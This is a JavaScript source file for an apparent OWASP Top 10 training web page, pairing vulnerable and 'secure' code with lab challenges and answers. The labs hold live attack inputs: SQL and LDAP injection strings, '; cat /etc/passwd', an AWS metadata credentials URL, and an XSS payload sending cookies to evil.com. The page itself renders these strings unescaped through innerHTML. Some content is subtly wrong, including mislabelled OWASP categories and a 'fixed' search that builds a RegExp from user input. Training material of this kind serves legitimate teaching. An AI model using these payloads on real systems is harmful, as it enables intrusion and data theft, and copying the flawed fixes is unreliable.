// OWASP Top 10:2025 Interactive Security Labs
// Hands-on vulnerability training with live demos and simulator

const OWASP_LABS = [
  {
    id: "sql-injection",
    title: "A01 - SQL Injection",
    description: "Learn how attackers inject malicious SQL code to bypass authentication and steal data",
    vulnerability: "SQL Injection allows attackers to manipulate SQL queries by inserting malicious code through user input, bypassing login systems and accessing unauthorized data.",
    severity: "CRITICAL",
    cvss: 9.8,
    realWorldExample: "A login form that directly concatenates user input: SELECT * FROM users WHERE username='admin' OR '1'='1' --' escapes security checks.",
    codeVulnerable: `// VULNERABLE CODE
app.post('/login', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;
  // Direct string concatenation = SQL injection risk!
  const query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'";
  db.query(query, (err, result) => {
    if (result.length > 0) res.send("Login successful");
    else res.send("Login failed");
  });
});`,
    codeFixed: `// SECURE CODE
app.post('/login', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;
  // Use parameterized queries to prevent SQL injection
  const query = "SELECT * FROM users WHERE username=? AND password=?";
  db.query(query, [username, password], (err, result) => {
    if (result.length > 0) res.send("Login successful");
    else res.send("Login failed");
  });
});`,
    preventionSteps: [
      "Use parameterized queries/prepared statements",
      "Implement input validation and sanitization",
      "Apply least privilege principle to database accounts",
      "Use ORM frameworks that auto-escape queries",
      "Enable SQL error suppression in production"
    ],
    labs: [
      {
        name: "Login Bypass Attack",
        description: "Try to bypass login by injecting SQL",
        challenge: "Username field accepts input. Try: admin' OR '1'='1",
        answer: "admin' OR '1'='1' --"
      },
      {
        name: "Data Extraction",
        description: "Extract sensitive data via UNION SELECT",
        challenge: "Extract user emails using: ' UNION SELECT email FROM users --",
        answer: "' UNION SELECT email FROM users --"
      },
      {
        name: "Blind SQL Injection",
        description: "Extract data without visible error messages",
        challenge: "Use time-based blind SQL: '; WAITFOR DELAY '00:00:05' --",
        answer: "time-based detection via response delay"
      }
    ]
  },
  {
    id: "broken-auth",
    title: "A02 - Broken Authentication",
    description: "Exploits in authentication mechanisms that allow unauthorized access",
    vulnerability: "Weak password policies, session token reuse, lack of MFA, and poor password storage enable attackers to hijack user accounts.",
    severity: "CRITICAL",
    cvss: 9.7,
    realWorldExample: "Storing passwords in plain text or with weak hashing (MD5) allows attackers to crack them in seconds.",
    codeVulnerable: `// VULNERABLE CODE
const bcrypt = require('bcrypt');
app.post('/register', (req, res) => {
  const email = req.body.email;
  // WEAK: MD5 hashing is broken - can be cracked in milliseconds
  const passwordHash = md5(req.body.password);
  db.query("INSERT INTO users VALUES (?, ?)", [email, passwordHash]);
  res.send("User registered");
});`,
    codeFixed: `// SECURE CODE
const bcrypt = require('bcrypt');
app.post('/register', async (req, res) => {
  const email = req.body.email;
  // STRONG: bcrypt with salt rounds
  const passwordHash = await bcrypt.hash(req.body.password, 12);
  db.query("INSERT INTO users VALUES (?, ?)", [email, passwordHash]);
  res.send("User registered");
});`,
    preventionSteps: [
      "Use strong hashing algorithms (bcrypt, Argon2, PBKDF2)",
      "Implement multi-factor authentication (MFA)",
      "Use secure session management with HTTP-only cookies",
      "Enforce strong password policies",
      "Implement account lockout after failed attempts",
      "Avoid session fixation vulnerabilities"
    ],
    labs: [
      {
        name: "Weak Password Cracking",
        description: "Crack an MD5 hash",
        challenge: "MD5 hash 'password123': 482c811da5d5b4bc6d497ffa98491e38",
        answer: "password123"
      },
      {
        name: "Session Hijacking",
        description: "Reuse a stolen session token",
        challenge: "Session token prediction with predictable IDs",
        answer: "Exploit sequential session IDs"
      },
      {
        name: "Credential Stuffing",
        description: "Test leaked credentials against login",
        challenge: "Automate login attempts with common passwords",
        answer: "Use credential lists against weak rate limiting"
      }
    ]
  },
  {
    id: "injection",
    title: "A03 - Injection (Various Types)",
    description: "NoSQL, OS, LDAP, and other injection attacks beyond SQL",
    vulnerability: "Any user input concatenated into commands without proper escaping creates injection risks across databases, operating systems, and frameworks.",
    severity: "CRITICAL",
    cvss: 9.6,
    realWorldExample: "NoSQL injection: db.find({username: {$ne: null}}) when username comes from user input",
    codeVulnerable: `// VULNERABLE: NoSQL Injection
app.post('/search', (req, res) => {
  const searchTerm = req.body.search;
  // Directly passing user input to MongoDB query
  db.collection('products').find({name: searchTerm}).toArray((err, results) => {
    res.send(results);
  });
});`,
    codeFixed: `// SECURE: Parameterized NoSQL query
app.post('/search', (req, res) => {
  const searchTerm = req.body.search;
  // Validate input before use
  if (typeof searchTerm !== 'string') return res.status(400).send("Invalid input");
  // Use RegExp for safe pattern matching
  db.collection('products').find({name: new RegExp(searchTerm, 'i')}).toArray((err, results) => {
    res.send(results);
  });
});`,
    preventionSteps: [
      "Always validate and sanitize user input",
      "Use parameterized queries and prepared statements",
      "Implement input whitelisting for expected formats",
      "Use command escaping functions",
      "Run processes with minimal privileges",
      "Disable dangerous commands in LDAP/command contexts"
    ],
    labs: [
      {
        name: "NoSQL Injection",
        description: "Bypass authentication via NoSQL operator",
        challenge: "Inject {$ne: null} to match all users",
        answer: "{$ne: null}"
      },
      {
        name: "OS Command Injection",
        description: "Execute arbitrary system commands",
        challenge: "Inject semicolon followed by command: ; ls -la",
        answer: "; cat /etc/passwd"
      },
      {
        name: "LDAP Injection",
        description: "Bypass LDAP authentication",
        challenge: "Close filter with * to match any: admin*",
        answer: "*)(uid=*"
      }
    ]
  },
  {
    id: "broken-access-control",
    title: "A04 - Broken Access Control",
    description: "Unauthorized access to resources due to inadequate permission checks",
    vulnerability: "Missing access control checks allow users to access resources they shouldn't be able to (IDOR, privilege escalation)",
    severity: "CRITICAL",
    cvss: 9.5,
    realWorldExample: "Accessing another user's profile via /user/profile?id=123 without checking if requester owns that account",
    codeVulnerable: `// VULNERABLE: No access control
app.get('/user/:id/profile', (req, res) => {
  const userId = req.params.id;
  // No check if current user is authorized to view this profile
  db.query("SELECT * FROM users WHERE id=?", [userId], (err, result) => {
    res.send(result); // Returns anyone's data!
  });
});`,
    codeFixed: `// SECURE: Check authorization
app.get('/user/:id/profile', (req, res) => {
  const userId = req.params.id;
  const currentUser = req.session.user;
  
  // Check if user is authorized to view this profile
  if (userId !== currentUser.id && currentUser.role !== 'admin') {
    return res.status(403).send("Unauthorized");
  }
  
  db.query("SELECT * FROM users WHERE id=?", [userId], (err, result) => {
    res.send(result);
  });
});`,
    preventionSteps: [
      "Implement role-based access control (RBAC)",
      "Verify user authorization on every request",
      "Use indirect object references (avoid exposing IDs)",
      "Log and monitor access attempts",
      "Implement proper permission inheritance",
      "Default deny access unless explicitly granted"
    ],
    labs: [
      {
        name: "Insecure Direct Object Reference (IDOR)",
        description: "Access another user's data via ID manipulation",
        challenge: "Change /profile?id=123 to /profile?id=456 to access different user",
        answer: "456"
      },
      {
        name: "Privilege Escalation",
        description: "Promote yourself from user to admin",
        challenge: "Modify user.role=user to user.role=admin in request",
        answer: "admin"
      },
      {
        name: "Admin Panel Access",
        description: "Access restricted admin area",
        challenge: "Navigate to /admin without proper authentication",
        answer: "/admin"
      }
    ]
  },
  {
    id: "security-misconfiguration",
    title: "A05 - Security Misconfiguration",
    description: "Insecure default settings, incomplete setups, and exposed cloud storage",
    vulnerability: "Default credentials, unnecessary services enabled, missing security headers, and exposed cloud buckets leak sensitive data",
    severity: "HIGH",
    cvss: 8.8,
    realWorldExample: "S3 bucket configured with public read access exposing millions of records",
    codeVulnerable: `// VULNERABLE: Missing security headers
app.use(express.json());
app.get('/api/data', (req, res) => {
  // No CORS headers = vulnerable to CSRF
  // No security headers = vulnerable to XSS/Clickjacking
  // No rate limiting = vulnerable to brute force
  res.json(sensitiveData);
});`,
    codeFixed: `// SECURE: Proper security configuration
const helmet = require('helmet');
app.use(helmet()); // Adds security headers
app.use(express.json({limit: '1mb'}));
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  next();
});`,
    preventionSteps: [
      "Change default credentials immediately",
      "Disable unnecessary services and features",
      "Set proper security headers (CSP, X-Frame-Options, etc.)",
      "Keep frameworks and libraries updated",
      "Remove debugging code from production",
      "Implement proper error handling without exposing stack traces",
      "Audit cloud storage permissions regularly"
    ],
    labs: [
      {
        name: "Exposed Cloud Bucket",
        description: "Find and access publicly exposed S3 bucket",
        challenge: "Public S3 bucket contains PII data",
        answer: "Configuration audit + bucket enumeration"
      },
      {
        name: "Default Credentials",
        description: "Login with default admin credentials",
        challenge: "Try admin:admin or admin:password",
        answer: "admin:admin"
      },
      {
        name: "Missing Security Headers",
        description: "Detect missing X-Frame-Options header",
        challenge: "Check response headers - is X-Frame-Options present?",
        answer: "No - vulnerable to clickjacking"
      }
    ]
  },
  {
    id: "xss",
    title: "A06 - Cross-Site Scripting (XSS)",
    description: "Injecting malicious JavaScript into web pages viewed by other users",
    vulnerability: "Unsanitized user input rendered in HTML allows attackers to execute JavaScript in victims' browsers, stealing cookies/sessions",
    severity: "CRITICAL",
    cvss: 9.4,
    realWorldExample: "<script>fetch('https://evil.com?cookie='+document.cookie)</script> in a comment field",
    codeVulnerable: `// VULNERABLE: Reflected XSS
app.get('/search', (req, res) => {
  const searchTerm = req.query.q;
  // Directly embedding user input in HTML = XSS vulnerability
  res.send("<h1>Search results for: " + searchTerm + "</h1>");
});

// VULNERABLE: Stored XSS
app.post('/comment', (req, res) => {
  const comment = req.body.comment;
  // Storing unsanitized HTML allows XSS for all viewers
  db.query("INSERT INTO comments VALUES (?)", [comment]);
  res.send("Comment saved");
});`,
    codeFixed: `// SECURE: Properly escaped output
const escapeHtml = require('escape-html');
app.get('/search', (req, res) => {
  const searchTerm = req.query.q;
  // Escape HTML special characters
  res.send("<h1>Search results for: " + escapeHtml(searchTerm) + "</h1>");
});

// SECURE: Sanitize HTML input
const DOMPurify = require('isomorphic-dompurify');
app.post('/comment', (req, res) => {
  const comment = req.body.comment;
  // Remove malicious scripts while preserving safe HTML
  const cleanComment = DOMPurify.sanitize(comment);
  db.query("INSERT INTO comments VALUES (?)", [cleanComment]);
  res.send("Comment saved");
});`,
    preventionSteps: [
      "Use templating engines that auto-escape output",
      "Sanitize and validate all user input",
      "Use Content Security Policy (CSP) headers",
      "Implement output encoding based on context",
      "Avoid innerHTML - use textContent or createElement",
      "Use security libraries like DOMPurify for rich text"
    ],
    labs: [
      {
        name: "Reflected XSS Attack",
        description: "Inject JavaScript into search parameter",
        challenge: "Inject: <script>alert('XSS')</script>",
        answer: "<script>alert('XSS')</script>"
      },
      {
        name: "Stored XSS in Comments",
        description: "Post malicious comment affecting all viewers",
        challenge: "Post comment: <img src=x onerror='fetch(evil.com)'>",
        answer: "<img src=x onerror=alert('hacked')>"
      },
      {
        name: "DOM-based XSS",
        description: "Manipulate JavaScript object directly",
        challenge: "Modify location.hash to execute JavaScript",
        answer: "#<img src=x onerror=alert(1)>"
      }
    ]
  },
  {
    id: "insecure-deserialization",
    title: "A07 - Insecure Deserialization",
    description: "Deserializing untrusted data leads to RCE and object injection attacks",
    vulnerability: "Unvalidated deserialization of user-supplied objects can execute arbitrary code during object instantiation",
    severity: "CRITICAL",
    cvss: 9.3,
    realWorldExample: "Java deserialization of untrusted object streams can invoke arbitrary methods during construction",
    codeVulnerable: `// VULNERABLE: Insecure deserialization
const pickle = require('pickle');
app.post('/deserialize', (req, res) => {
  const data = req.body.serializedObject;
  // Directly deserializing untrusted data = RCE risk
  const obj = pickle.loads(Buffer.from(data, 'base64'));
  res.send("Deserialized: " + obj);
});`,
    codeFixed: `// SECURE: Use JSON with validation
app.post('/deserialize', (req, res) => {
  let obj;
  try {
    // Use JSON which doesn't execute code during parsing
    const data = req.body.jsonData;
    obj = JSON.parse(data);
    
    // Validate structure before using
    if (!obj.hasOwnProperty('name') || typeof obj.name !== 'string') {
      return res.status(400).send("Invalid input");
    }
    res.send("Deserialized: " + obj.name);
  } catch (e) {
    res.status(400).send("Parse error");
  }
});`,
    preventionSteps: [
      "Avoid native deserialization of untrusted data",
      "Use JSON instead of binary serialization formats",
      "Implement strict input validation after deserialization",
      "Use allow-lists for acceptable classes",
      "Run deserialization in sandboxed environments",
      "Monitor and log deserialization activities"
    ],
    labs: [
      {
        name: "Java Deserialization RCE",
        description: "Execute code via gadget chain",
        challenge: "Use ysoserial tool to generate RCE payload",
        answer: "Runtime.getRuntime().exec() via gadget chain"
      },
      {
        name: "PHP Object Injection",
        description: "Exploit __wakeup/__destruct magic methods",
        challenge: "Inject serialized object: O:4:\"Evil\":1:{s:4:\"file\";s:11:\"config.php\";}",
        answer: "File deletion via __destruct"
      },
      {
        name: "Python Pickle RCE",
        description: "Execute arbitrary Python code",
        challenge: "Create pickle payload that runs system commands",
        answer: "os.system() via pickle.loads()"
      }
    ]
  },
  {
    id: "logging-monitoring",
    title: "A08 - Software & Data Integrity Failures",
    description: "Missing logging, monitoring, and integrity verification allows attacks to go undetected",
    vulnerability: "Insufficient logging and monitoring makes it impossible to detect breaches, unauthorized access, or tampering",
    severity: "HIGH",
    cvss: 8.6,
    realWorldExample: "No audit logs = attackers cover their tracks; no integrity checks = backdoors installed silently",
    codeVulnerable: `// VULNERABLE: No logging
app.post('/transfer', (req, res) => {
  const amount = req.body.amount;
  const to = req.body.to;
  // No logging of sensitive transaction
  transferFunds(amount, to);
  res.send("Transfer complete");
});

// VULNERABLE: No integrity checks
app.post('/upload', (req, res) => {
  const file = req.files.file;
  // No checksum verification = malicious file acceptance
  fs.writeFileSync('./uploads/' + file.name, file.data);
  res.send("File uploaded");
});`,
    codeFixed: `// SECURE: Comprehensive logging
const winston = require('winston');
app.post('/transfer', (req, res) => {
  const amount = req.body.amount;
  const to = req.body.to;
  const user = req.session.user;
  
  transferFunds(amount, to);
  
  // Log all financial transactions
  winston.info('Fund transfer', {
    from: user.id,
    to: to,
    amount: amount,
    timestamp: new Date(),
    ip: req.ip
  });
  res.send("Transfer complete");
});

// SECURE: Verify file integrity
const crypto = require('crypto');
app.post('/upload', (req, res) => {
  const file = req.files.file;
  const providedHash = req.body.file_hash;
  
  // Calculate and verify file checksum
  const hash = crypto.createHash('sha256')
    .update(file.data)
    .digest('hex');
  
  if (hash !== providedHash) {
    return res.status(400).send("File integrity check failed");
  }
  
  fs.writeFileSync('./uploads/' + file.name, file.data);
  res.send("File uploaded");
});`,
    preventionSteps: [
      "Log all security-relevant events (login, access, changes)",
      "Protect log files from tampering",
      "Implement centralized log management",
      "Set up real-time alerts for suspicious activities",
      "Verify file/data integrity with checksums/signatures",
      "Monitor application health and performance",
      "Retain logs for audit and forensics"
    ],
    labs: [
      {
        name: "Cover Your Tracks",
        description: "Delete logs to hide attack",
        challenge: "Identify which log files were deleted",
        answer: "Log tampering detection via log rotation"
      },
      {
        name: "Silent Backdoor Installation",
        description: "Install backdoor without detection",
        challenge: "File modified but no checksum verification",
        answer: "Backdoor detection via integrity checks"
      },
      {
        name: "Undetected Privilege Escalation",
        description: "Escalate privileges without logging",
        challenge: "Missing security event logs",
        answer: "Enable sudo audit logging"
      }
    ]
  },
  {
    id: "ssrf",
    title: "A09 - Server-Side Request Forgery (SSRF)",
    description: "Tricks the server into making requests to unintended destinations",
    vulnerability: "User-controlled URLs allow attackers to access internal services, cloud metadata endpoints, or perform port scanning",
    severity: "HIGH",
    cvss: 8.7,
    realWorldExample: "URL parameter passed to fetch() without validation: fetch(req.query.url) accesses AWS metadata",
    codeVulnerable: `// VULNERABLE: SSRF
app.get('/fetch-url', (req, res) => {
  const url = req.query.url;
  // User controls the URL = SSRF vulnerability
  fetch(url).then(r => r.text()).then(text => {
    res.send(text);
  });
});`,
    codeFixed: `// SECURE: SSRF prevention
const url = require('url');
app.get('/fetch-url', (req, res) => {
  const targetUrl = req.query.url;
  
  // Validate URL format and protocol
  let parsed;
  try {
    parsed = new URL(targetUrl);
  } catch {
    return res.status(400).send("Invalid URL");
  }
  
  // Block dangerous protocols
  if (!['http:', 'https:'].includes(parsed.protocol)) {
    return res.status(400).send("Invalid protocol");
  }
  
  // Block private IP ranges
  const ip = require('ip');
  if (ip.isPrivate(parsed.hostname)) {
    return res.status(400).send("Access denied to private IPs");
  }
  
  fetch(targetUrl).then(r => r.text()).then(text => {
    res.send(text);
  });
});`,
    preventionSteps: [
      "Whitelist allowed URLs/domains",
      "Block private IP ranges (127.0.0.1, 192.168.*, etc.)",
      "Disable dangerous protocols (file://, gopher://, etc.)",
      "Use DNS allowlisting for domain resolution",
      "Implement request rate limiting",
      "Disable HTTP redirects or validate redirect targets"
    ],
    labs: [
      {
        name: "Access AWS Metadata",
        description: "Read AWS credentials from metadata endpoint",
        challenge: "Fetch http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        answer: "AWS credentials exposure"
      },
      {
        name: "Port Scanning Internal Network",
        description: "Scan internal ports to find services",
        challenge: "Request http://192.168.1.1:8080 (internal server)",
        answer: "Internal port discovery"
      },
      {
        name: "Access Internal APIs",
        description: "Query internal microservices",
        challenge: "Fetch http://internal-api.company.local/admin",
        answer: "Bypass network segmentation"
      }
    ]
  },
  {
    id: "vulnerable-components",
    title: "A10 - Using Components with Known Vulnerabilities",
    description: "Using outdated libraries and frameworks with publicly known security flaws",
    vulnerability: "Dependencies with known CVEs allow attackers to exploit disclosed vulnerabilities automatically",
    severity: "HIGH",
    cvss: 8.5,
    realWorldExample: "npm package with 5-year-old dependency containing RCE vulnerability - thousands of apps affected",
    codeVulnerable: `// VULNERABLE: Using old versions
package.json with outdated dependencies:
{
  "dependencies": {
    "express": "4.16.0",  // Has known auth bypass
    "lodash": "4.17.5",   // RCE vulnerability
    "request": "2.81.0"   // SSRF vulnerability
  }
}`,
    codeFixed: `// SECURE: Keep dependencies updated
{
  "dependencies": {
    "express": "4.18.2",  // Latest patched version
    "lodash": "4.17.21",  // Latest with security fixes
    "node-fetch": "3.3.0" // Modern replacement for request
  },
  "scripts": {
    "audit": "npm audit",
    "update": "npm update",
    "security-check": "npm audit --audit-level=moderate"
  }
}`,
    preventionSteps: [
      "Keep all dependencies updated regularly",
      "Use npm audit / cargo audit / equivalent tools",
      "Remove unused dependencies",
      "Use Software Composition Analysis (SCA) tools",
      "Subscribe to security advisories for key packages",
      "Implement dependency lock files",
      "Run automated security scanning in CI/CD",
      "Monitor for 0-day vulnerabilities"
    ],
    labs: [
      {
        name: "Exploit lodash RCE",
        description: "Use known CVE in lodash",
        challenge: "Exploit CVE-2021-23337 in lodash <= 4.17.20",
        answer: "Template injection leading to RCE"
      },
      {
        name: "Identify Vulnerable Packages",
        description: "Run npm audit to find vulnerabilities",
        challenge: "Scan node_modules for known CVEs",
        answer: "npm audit will show vulnerable packages"
      },
      {
        name: "Supply Chain Attack",
        description: "Compromised dependency in supply chain",
        challenge: "Package maintainer account compromised, malicious code injected",
        answer: "Code review + vendor security assessment"
      }
    ]
  }
];

export async function handleOWASPLabs(pathname, request, env, ctx) {
  const url = new URL(request.url);
  
  // API endpoints
  if (pathname.startsWith('/owasp-labs/api/')) {
    const apiPath = pathname.slice('/owasp-labs/api/'.length);
    
    if (apiPath === 'labs' && request.method === 'GET') {
      return jsonResponse(OWASP_LABS.map(lab => ({
        id: lab.id,
        title: lab.title,
        description: lab.description,
        severity: lab.severity,
        cvss: lab.cvss,
        labs: lab.labs.length
      })));
    }
    
    if (apiPath.startsWith('lab/')) {
      const labId = apiPath.slice('lab/'.length);
      const lab = OWASP_LABS.find(l => l.id === labId);
      if (lab) return jsonResponse(lab);
      return jsonResponse({error: 'Lab not found'}, 404);
    }
  }
  
  // Main UI
  return new Response(renderOWASPLabsUI(), {
    headers: { 'Content-Type': 'text/html; charset=utf-8' }
  });
}

function renderOWASPLabsUI() {
  const labsHtml = OWASP_LABS.map((lab, idx) => `
    <div class="lab-card" onclick="loadLab('${lab.id}')">
      <div class="severity-${lab.severity.toLowerCase()}">${lab.severity}</div>
      <h3>${lab.title}</h3>
      <p>${lab.description}</p>
      <div class="cvss">CVSS: ${lab.cvss}</div>
      <div class="lab-count">${lab.labs.length} Labs</div>
    </div>
  `).join('');
  
  return `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>OWASP Top 10:2025 Interactive Labs</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { 
      font-family: 'Courier New', monospace;
      background: linear-gradient(135deg, #0a0a0f 0%, #16213e 100%);
      color: #00ff41;
      min-height: 100vh;
      padding: 20px;
    }
    
    .header {
      text-align: center;
      margin-bottom: 40px;
      border-bottom: 3px solid #00ff41;
      padding-bottom: 20px;
    }
    
    .header h1 {
      font-size: 32px;
      text-shadow: 0 0 10px #00ff41;
      margin-bottom: 10px;
    }
    
    .header p {
      color: #00cc33;
      font-size: 14px;
    }
    
    .container {
      max-width: 1400px;
      margin: 0 auto;
    }
    
    .lab-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
      gap: 20px;
      margin-bottom: 40px;
    }
    
    .lab-card {
      background: rgba(0, 255, 65, 0.05);
      border: 2px solid #00ff41;
      padding: 20px;
      border-radius: 8px;
      cursor: pointer;
      transition: all 0.3s;
      position: relative;
    }
    
    .lab-card:hover {
      background: rgba(0, 255, 65, 0.1);
      box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
      transform: translateY(-5px);
    }
    
    .severity-critical {
      display: inline-block;
      background: #ff0000;
      color: white;
      padding: 4px 8px;
      border-radius: 4px;
      font-size: 12px;
      margin-bottom: 10px;
      font-weight: bold;
    }
    
    .severity-high {
      display: inline-block;
      background: #ff6600;
      color: white;
      padding: 4px 8px;
      border-radius: 4px;
      font-size: 12px;
      margin-bottom: 10px;
      font-weight: bold;
    }
    
    .lab-card h3 {
      color: #00ff41;
      margin: 10px 0;
      font-size: 16px;
    }
    
    .lab-card p {
      color: #00cc33;
      font-size: 12px;
      line-height: 1.6;
      margin: 10px 0;
    }
    
    .cvss {
      color: #ffaa00;
      font-size: 11px;
      margin: 8px 0;
    }
    
    .lab-count {
      color: #0099ff;
      font-size: 11px;
      margin-top: 8px;
    }
    
    .detail-view {
      display: none;
      background: rgba(0, 0, 0, 0.7);
      border: 2px solid #00ff41;
      padding: 30px;
      border-radius: 8px;
      margin-bottom: 40px;
    }
    
    .detail-view.active {
      display: block;
    }
    
    .close-btn {
      background: #ff0000;
      color: white;
      border: none;
      padding: 8px 16px;
      border-radius: 4px;
      cursor: pointer;
      float: right;
    }
    
    .close-btn:hover {
      background: #cc0000;
    }
    
    .code-block {
      background: rgba(0, 0, 0, 0.5);
      border-left: 3px solid #00ff41;
      padding: 15px;
      margin: 15px 0;
      overflow-x: auto;
      font-size: 12px;
      line-height: 1.5;
    }
    
    .vulnerable { border-left-color: #ff0000; }
    .fixed { border-left-color: #00ff41; }
    
    .lab-section {
      margin: 20px 0;
      padding: 15px;
      background: rgba(0, 255, 65, 0.05);
      border: 1px solid #00ff41;
      border-radius: 4px;
    }
    
    .lab-section h4 {
      color: #0099ff;
      margin-bottom: 10px;
    }
    
    .lab-challenge {
      background: rgba(255, 0, 0, 0.1);
      border: 1px solid #ff0000;
      padding: 10px;
      margin: 10px 0;
      border-radius: 4px;
      color: #ff6666;
    }
    
    .lab-answer {
      background: rgba(0, 255, 65, 0.1);
      border: 1px solid #00ff41;
      padding: 10px;
      margin: 10px 0;
      border-radius: 4px;
      color: #00ff41;
      display: none;
    }
    
    .show-answer {
      background: #0099ff;
      color: white;
      border: none;
      padding: 8px 16px;
      border-radius: 4px;
      cursor: pointer;
      margin-top: 10px;
    }
    
    .show-answer:hover {
      background: #0077cc;
    }
    
    .prevention-steps {
      list-style: none;
      margin: 15px 0;
    }
    
    .prevention-steps li {
      color: #00ff41;
      padding: 8px 0;
      padding-left: 20px;
      position: relative;
    }
    
    .prevention-steps li:before {
      content: "✓ ";
      position: absolute;
      left: 0;
      color: #00ff41;
    }
    
    @media (max-width: 768px) {
      .lab-grid {
        grid-template-columns: 1fr;
      }
      .header h1 {
        font-size: 24px;
      }
    }
  </style>
</head>
<body>
  <div class="header">
    <h1>⚠️ OWASP Top 10:2025 Interactive Labs</h1>
    <p>Hands-on security vulnerability training • Learn, exploit, and fix vulnerabilities</p>
  </div>
  
  <div class="container">
    <div class="lab-grid" id="labGrid">
      ${labsHtml}
    </div>
    
    <div class="detail-view" id="detailView">
      <!-- Lab details loaded here -->
    </div>
  </div>
  
  <script>
    const labs = ${JSON.stringify(OWASP_LABS)};
    
    function loadLab(labId) {
      const lab = labs.find(l => l.id === labId);
      if (!lab) return;
      
      const labsEl = document.getElementById('labsEl');
      const detailEl = document.getElementById('detailView');
      
      let labsHtml = lab.labs.map((l, idx) => \`
        <div class="lab-section">
          <h4>Lab \${idx + 1}: \${l.name}</h4>
          <p>\${l.description}</p>
          <div class="lab-challenge">Challenge: \${l.challenge}</div>
          <button class="show-answer" onclick="toggleAnswer(\${idx})">Show Answer</button>
          <div class="lab-answer" id="answer-\${idx}">Answer: \${l.answer}</div>
        </div>
      \`).join('');
      
      detailEl.innerHTML = \`
        <button class="close-btn" onclick="closeLab()">✕ Close</button>
        <h2>\${lab.title}</h2>
        <p>\${lab.description}</p>
        
        <div class="lab-section">
          <h4>Vulnerability Explanation</h4>
          <p>\${lab.vulnerability}</p>
          <div style="margin-top: 10px; color: #ffaa00;">Severity: <strong>\${lab.severity}</strong> | CVSS: <strong>\${lab.cvss}</strong></div>
        </div>
        
        <div class="lab-section">
          <h4>Real-World Example</h4>
          <p style="color: #ffaa00;">\${lab.realWorldExample}</p>
        </div>
        
        <div class="lab-section">
          <h4>Vulnerable Code ❌</h4>
          <div class="code-block vulnerable">\${lab.codeVulnerable}</div>
        </div>
        
        <div class="lab-section">
          <h4>Secure Code ✓</h4>
          <div class="code-block fixed">\${lab.codeFixed}</div>
        </div>
        
        <div class="lab-section">
          <h4>Prevention Steps</h4>
          <ul class="prevention-steps">
            \${lab.preventionSteps.map(step => \`<li>\${step}</li>\`).join('')}
          </ul>
        </div>
        
        <h4 style="margin-top: 30px; color: #0099ff;">🎯 Interactive Labs (\${lab.labs.length})</h4>
        \${labsHtml}
      \`;
      
      detailEl.classList.add('active');
      window.scrollTo({top: 0, behavior: 'smooth'});
    }
    
    function closeLab() {
      document.getElementById('detailView').classList.remove('active');
    }
    
    function toggleAnswer(idx) {
      const el = document.getElementById('answer-' + idx);
      el.style.display = el.style.display === 'none' ? 'block' : 'none';
    }
  </script>
</body>
</html>
  `;
}

function jsonResponse(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { 'Content-Type': 'application/json' }
  });
}
